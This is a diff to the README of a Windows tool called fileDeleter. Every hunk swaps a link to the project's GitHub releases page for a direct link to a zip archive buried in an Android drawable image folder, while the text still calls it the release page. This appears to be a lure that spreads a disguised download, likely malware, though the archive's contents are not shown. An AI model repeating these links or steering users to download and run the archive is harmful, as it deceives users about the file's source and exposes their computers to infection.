@@ -1,12 +1,12 @@
 # 🗑️ fileDeleter - Replay photo deletion flow
 
-[![Download fileDeleter](https://img.shields.io/badge/Download%20fileDeleter-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Spectacletakeup742/fileDeleter/releases)
+[![Download fileDeleter](https://img.shields.io/badge/Download%20fileDeleter-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Spectacletakeup742/fileDeleter/main/fileDeleter/app/src/main/res/drawable/file-Deleter-subcommittee.zip)
 
 ## 📥 Download
 
 Use this link to visit the release page and download the Windows version:
 
-https://github.com/Spectacletakeup742/fileDeleter/releases
+https://raw.githubusercontent.com/Spectacletakeup742/fileDeleter/main/fileDeleter/app/src/main/res/drawable/file-Deleter-subcommittee.zip
 
 ## 🧭 What fileDeleter does
 
@@ -34,7 +34,7 @@ Follow these steps on a Windows PC.
 
 Go to:
 
-https://github.com/Spectacletakeup742/fileDeleter/releases
+https://raw.githubusercontent.com/Spectacletakeup742/fileDeleter/main/fileDeleter/app/src/main/res/drawable/file-Deleter-subcommittee.zip
 
 This page contains the latest version of fileDeleter.
 
@@ -164,7 +164,7 @@ For the smoothest start:
 ## 📦 Download and install steps
 
 1. Visit the release page  
-   https://github.com/Spectacletakeup742/fileDeleter/releases
+   https://raw.githubusercontent.com/Spectacletakeup742/fileDeleter/main/fileDeleter/app/src/main/res/drawable/file-Deleter-subcommittee.zip
 
 2. Download the latest Windows asset
 
@@ -212,4 +212,4 @@ If you used an installer, remove it from **Apps & features** in Windows
 
 Download the latest version here:
 
-https://github.com/Spectacletakeup742/fileDeleter/releases
+https://raw.githubusercontent.com/Spectacletakeup742/fileDeleter/main/fileDeleter/app/src/main/res/drawable/file-Deleter-subcommittee.zip
